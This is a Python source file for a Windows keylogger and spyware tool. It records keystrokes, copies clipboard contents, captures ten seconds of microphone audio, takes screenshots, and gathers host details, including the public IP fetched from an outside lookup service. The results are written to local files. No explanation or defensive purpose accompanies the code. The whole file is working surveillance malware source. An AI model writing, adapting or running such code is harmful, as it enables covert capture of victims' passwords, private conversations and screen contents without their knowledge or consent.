import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd


import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_file = "key_log.txt"
file_path = "C:\\Users\\Kathir Sudan\\Desktop\\Python Programs"
extend = "\\"

system_info = "systeminfo.txt"

clipboard_info = "clipboard.txt"

audio_info = "audio.wav"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

screenshot_info = "screenshot.png"

def computer_info():
    with open(file_path + extend + system_info,"a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try :
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip +"\n")
        except Exception:
            f.write("Couldn't get Public IP Address(most likely max query)\n")

        f.write("Processor: "+ platform.processor() + '\n')
        f.write("System: " + platform.system() + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + "\n")

computer_info()

def copy_clipboard():
    with open(file_path + extend + clipboard_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: -\n" + pasted_data)
        except:
            f.write("Clipboard could not be copied.")

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info , fs, myrecording)

microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count=0
    keys=[]

    def on_press(key):
        global count, keys, currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()

        if count >=1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(key):
        with open(file_path + extend + keys_file,"a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_file,"w") as f:
            f.write(" ")
        screenshot()
        copy_clipboard()
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration